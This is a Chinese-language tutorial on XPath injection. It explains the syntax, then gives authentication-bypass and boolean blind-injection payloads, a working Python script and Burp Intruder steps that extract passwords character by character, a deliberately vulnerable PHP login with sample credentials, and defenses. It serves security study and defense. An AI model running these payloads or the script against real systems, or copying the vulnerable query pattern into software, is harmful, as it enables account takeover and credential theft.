# XPath注入

## 一句话理解
XPath 注入的本质，是用户输入进入 XPath 查询表达式后，改变原本的节点匹配逻辑，从而绕过认证、读取 XML 数据或在无回显场景下进行盲注枚举。

## 基础理解
XPath 是用于在 XML 文档中定位节点的查询语言，作用类似于“XML 世界里的 SQL”。  
因此，当应用把用户输入直接拼进 XPath 表达式时，就会出现与 SQL 注入类似的安全问题。

## XPath 语法速查
| 语法 / 函数 | 含义 |
| --- | --- |
| `//` | 从文档任意层级选取匹配节点（后代搜索） |
| `/` | 从根或当前节点选取直接子级 |
| `..` | 选取父节点 |
| `*` | 通配符，匹配任意元素节点 |
| `@attr` | 选取 / 测试属性（如 `@id='1'`） |
| `[条件]` | 谓词，按条件过滤节点集 |
| `text()` | 取节点的文本内容 |
| `position()` | 当前节点在节点集中的序号 |
| `last()` | 节点集中最后一个节点的序号 |
| `count(节点集)` | 统计节点数量 |
| `name()` | 返回当前节点名 |
| `string-length(字符串)` | 返回字符串长度 |
| `substring(字符串,起始,长度)` | 截取子串，起始位从 1 开始 |
| `contains(字符串,子串)` | 判断是否包含子串 |
| `starts-with(字符串,前缀)` | 判断是否以指定前缀开头 |

提示：
- XPath 的节点下标和 `substring` 起始位都从 **1** 开始，不是 0。
- 谓词内可调用上述所有函数，这是盲注时的“数据出口”。

## 常见场景
- XML 存储的用户认证
- 旧系统配置查询
- SSO / 身份系统中的 XML 处理
- SOAP / XML WebService
- 本地 XML 配置文件查询

## 常见危害
- 登录绕过
- 读取 XML 中的敏感字段
- 枚举节点、属性和值
- 在无回显场景下做盲注

## 常见成因
- 直接字符串拼接 XPath
- 认为 XML 不是数据库，因此忽略注入风险
- 只做简单引号替换，没有参数化或安全构造

## 典型利用思路
### 1. 认证绕过
若查询类似：

```text
//users/user[name='$name' and password='$pass']
```

攻击者可通过构造逻辑表达式改变匹配条件，实现认证绕过。

### 2. 条件控制
常见利用与 SQL 注入类似，围绕：
- `or`
- `and`
- 字符串闭合
- 节点条件变形

### 3. 盲注枚举
若结果只返回真假，可通过字符比较逐步枚举：
- 节点名
- 属性名
- 节点值

## 认证绕过 Payload
仍以上文查询为例：

```text
//users/user[name='$name' and password='$pass']
```

常用 payload：

| 注入点 | Payload | 效果 |
| --- | --- | --- |
| name | `' or '1'='1` | 拼接后谓词出现恒真比较 |
| name | `' or 1=1 or ''='` | 单点注入即恒真 |
| password | `' or '1'='1` | 位于 or 末尾，单点注入即恒真 |
| name | `x' or name()='admin' or 'x'='y` | 借 `name()` 按节点名定位目标账户 |

### 拼接效果分析
name 与 password 同时注入 `' or '1'='1`，拼接后：

```text
//users/user[name='' or '1'='1' and password='' or '1'='1']
```

XPath 中 `and` 优先级高于 `or`，等价于：

```text
(name='') or ('1'='1' and password='') or ('1'='1')
```

最后一项 `'1'='1'` 恒真 → 整个谓词恒真 → 匹配所有 user 节点，程序取第一个节点即完成登录（通常是管理员）。

仅注入 password 为 `' or '1'='1` 时：

```text
//users/user[name='$name' and password='' or '1'='1']
```

末尾 `'1'='1'` 恒真，同样绕过整体条件。

仅注入 name 为 `' or 1=1 or ''='` 时：

```text
//users/user[name='' or 1=1 or ''='' and password='$pass']
```

`1=1` 恒真，与后续 password 条件无关，直接绕过。

注入 name 为 `x' or name()='admin' or 'x'='y` 时：

```text
//users/user[name='x' or name()='admin' or 'x'='y' and password='$pass']
```

`name()` 返回上下文节点名；当 XML 以节点名区分账户（如 `<admin>` 节点）时可命中管理员，实现“指定身份登录”，是否生效取决于 XML 结构。

## 盲注 Payload
适用场景：页面只返回“登录成功 / 失败”等真假两种状态，无法直接回显数据。

以单参数查询 `//user[name='$input']` 为例（尾部引号由原查询补全）：

```text
# 逐字符猜解：第一个 user 的密码第 1 位是否为 'a'
' or substring(//user[1]/password,1,1)='a

# 测长度：密码长度是否为 8
' or string-length(//user[1]/password)=8 and '1'='1
```

若原查询用双引号包裹（`name="$input"`），payload 内部单引号可自由闭合，写成 `'a'` 也可以：

```text
' or substring(//user[1]/password,1,1)='a'
```

### Python 盲注脚本骨架
```python
import requests
import string

# 目标登录接口（仅用于授权测试环境）
url = "http://target/login.php"

def check(payload):
    # 发送注入请求，根据响应内容判断注入条件真假
    data = {"name": payload, "password": "whatever"}
    r = requests.post(url, data=data, timeout=5)
    # 按实际页面特征调整关键字：响应含 "Welcome" 即条件为真
    return "Welcome" in r.text

def get_length():
    # 先枚举目标字段长度
    for n in range(1, 65):
        # 尾部不闭合引号，由原查询 name='$input' 右侧单引号补全
        payload = f"' or string-length(//user[1]/password)={n} and '1'='1"
        if check(payload):
            return n
    return 0

def get_password(length):
    # 再逐字符枚举密码
    charset = string.ascii_letters + string.digits + "!@#$%_"
    result = ""
    for pos in range(1, length + 1):
        for ch in charset:
            # 判断第 pos 位是否为 ch
            payload = f"' or substring(//user[1]/password,{pos},1)='{ch}"
            if check(payload):
                result += ch
                print(f"[+] pos {pos}: {ch}")
                break
    return result

if __name__ == "__main__":
    length = get_length()
    print(f"[+] password length = {length}")
    print(f"[+] password = {get_password(length)}")
```

注意：脚本输出 / 字符串保持英文，仅注释使用中文；若注入点上下文不同（如双参数查询），需按「认证绕过 Payload」的方式调整 payload 结构。

## 工具
- **xcat**：XPath 注入自动化利用工具（Python），支持布尔盲注 / 报错注入，可自动推断查询结构并枚举整个 XML 文档内容。
  - https://github.com/orf/xcat
- **Burp Intruder 逐位爆破**：
  1. 构造 payload 模板：`' or substring(//user[1]/password,§pos§,1)='§char§`
  2. 两个注入位：`§pos§` 用数字字典（1..N），`§char§` 用可打印字符字典。
  3. 选择 Cluster Bomb 模式运行，通过响应长度或关键字（如 `Welcome`）区分命中。
  4. 所有命中的 (pos, char) 组合拼起来即完整密码。

## 案例
### 漏洞代码
用户表 `users.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <name>admin</name>
        <password>s3cret</password>
        <role>administrator</role>
    </user>
    <user>
        <name>bob</name>
        <password>bob123</password>
        <role>user</role>
    </user>
</users>
```

登录页 `login.php`（用户输入直接拼接进 XPath）：

```php
<?php
// 漏洞代码：用户输入未做任何处理，直接拼接进 XPath 查询
$name = $_POST['name'];
$pass = $_POST['password'];

$xml  = simplexml_load_file('users.xml');
// 直接拼接构造查询，存在 XPath 注入
$query  = "//users/user[name='{$name}' and password='{$pass}']";
$result = $xml->xpath($query);

if ($result) {
    // 命中即视为登录成功，取第一个匹配节点
    echo "Welcome, " . $result[0]->name;
} else {
    echo "Login failed";
}
```

### 利用过程
1. **探测**：name 输入单引号 `'` → 返回 XPath 语法错误（或行为异常），确认存在拼接注入。
2. **认证绕过**：name 与 password 均输入 `' or '1'='1`：

```text
拼接后: //users/user[name='' or '1'='1' and password='' or '1'='1']
等价于: (name='') or ('1'='1' and password='') or ('1'='1') → 恒真
```

   匹配所有 user 节点，返回第一个，直接以 admin 身份登录。
3. **盲注枚举密码**：password 随便填，name 注入（`'x'='y'` 恒假块负责吃掉 password 条件）：

```text
# 测长度（长度为 6 时页面返回 Welcome）
x' or string-length(//user[1]/password)=6 or 'x'='y

# 逐字符猜解（第 1 位为 s 时登录成功）
x' or substring(//user[1]/password,1,1)='s' or 'x'='y
```

   谓词等价于 `substring(...)=...`，登录成功即该位字符正确，逐位猜出 admin 密码 `s3cret`。
4. **自动化**：把上述 payload 交给 Python 脚本或 Burp Intruder 跑字典，即可拖出整张“用户表”（换 `//user[2]` 还能枚举其他未知账户）。

## 实战排查思路
### 1. 先判断后端是否使用 XML 存储或查询
重点看：
- 用户认证逻辑
- XML 配置解析
- SOAP 相关接口
- 旧系统单点登录

### 2. 再看输入是否进入 XPath
关注：
- 字符串拼接构造 XPath
- 认证条件
- 搜索过滤条件

### 3. 再判断回显类型
区分：
- 直接回显
- 报错回显
- 布尔盲注

## 常见绕过思路
### 1. 引号闭合
若原查询使用单引号或双引号，需要先判断闭合方式。

### 2. 布尔逻辑控制
和 SQL 注入类似，可通过真假表达式测试当前注入点是否成立。

### 3. 无回显场景
若无法直接读值，就退到布尔盲注，逐字符枚举 XML 节点和属性。

## 防御要点
### 1. 不拼接 XPath
应使用安全的参数绑定、预定义查询或安全构造 API。

### 2. 做输入校验
对用户输入做类型限制、白名单限制，避免进入 XPath 语法结构。

### 3. 最小化错误信息
不要把完整 XPath 异常和 XML 结构直接返回前端。

### 4. 尽量避免用 XML 处理敏感认证逻辑
历史系统中这类场景尤其常见，应优先改造。

## 速查清单
- 先确认是否存在 XML 查询和认证逻辑
- 先测试引号闭合和真假条件
- 再判断是否可直接回显或只能盲注
- 重点排查老系统、SSO、SOAP、XML 配置查询
- 把 XPath 注入当成“XML 版 SQL 注入”来建立思路

## Reference
- [XPath 注入指北](https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)
- [OWASP - XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [W3Schools - XPath Tutorial](https://www.w3schools.com/xml/xpath_intro.asp)
